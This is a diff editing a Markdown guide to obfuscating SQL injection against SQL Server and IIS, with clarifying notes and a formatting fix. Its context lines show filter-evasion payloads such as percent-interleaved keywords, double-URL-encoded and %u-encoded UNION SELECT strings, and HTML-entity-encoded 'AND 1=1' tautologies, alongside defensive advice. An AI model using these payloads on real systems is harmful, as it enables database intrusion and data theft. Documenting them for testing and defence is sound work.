@@ -53,7 +53,7 @@ S%E%L%E%C%T column FROM table
 
 -- "AND 1=1" with % signs (and multiple % signs)
 A%%ND 1=%%%%%%%%1
-````
+```
 
 ### Allowed Intermediary Characters (Whitespace)
 
@@ -93,7 +93,8 @@ The following characters can be used instead of spaces:
 | `%1E` | Record Separator     |
 | `%1F` | Unit Separator       |
 | `%20` | Space                |
-| `%25` | Percent Sign         |
+
+**Note:** `%25` (percent sign) is not whitespace but can be used for obfuscation in IIS/ASP environments (see IIS/ASP Specific Obfuscation section above).
 
 ### Characters Avoiding Spaces
 
@@ -119,7 +120,7 @@ The following characters can appear immediately after AND/OR:
 | `%5C`     | `\`       | Backslash     |
 | `%7E`     | `~`       | Tilde         |
 
-Example:
+Example (`\` denotes a space character per the table above):
 
 ```sql
 SELECT 1 FROM[table]WHERE\1=\1AND\1=\1
@@ -241,7 +242,7 @@ SELECT%2520*%2520FROM%2520users
 SELECT+%u0055NION+%u0053ELECT+1,2,3--
 
 -- HTML Entities (for web contexts)
--- AND 1=1 as HTML entities:
+-- Decodes to: AND 1=1
 %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
 ```
 
@@ -353,3 +354,4 @@ To protect against obfuscation techniques:
 5. Consider using an ORM that prevents direct SQL access
 6. Monitor and rate-limit suspicious queries
 7. Use SQL Server's built-in security features like Extended Events to monitor for unusual SQL patterns
+````
